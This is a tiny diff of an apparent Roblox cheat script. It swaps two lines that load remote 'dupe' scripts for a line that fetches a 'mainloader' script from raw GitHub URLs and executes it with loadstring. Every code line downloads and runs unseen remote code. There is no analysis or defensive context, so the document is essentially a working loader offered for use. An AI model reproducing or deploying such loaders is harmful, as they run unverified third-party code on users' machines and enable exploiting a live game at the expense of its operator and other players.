@@ -1,2 +1,2 @@
-loadstring(game:HttpGet('https://raw.githubusercontent.com/Penguin284/script/main/dupe1'))()
-loadstring(game:HttpGet('https://raw.githubusercontent.com/Penguin284/script/main/dupe2'))()
+_G.a = "d"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Penguin284/script/main/mainloader"))()
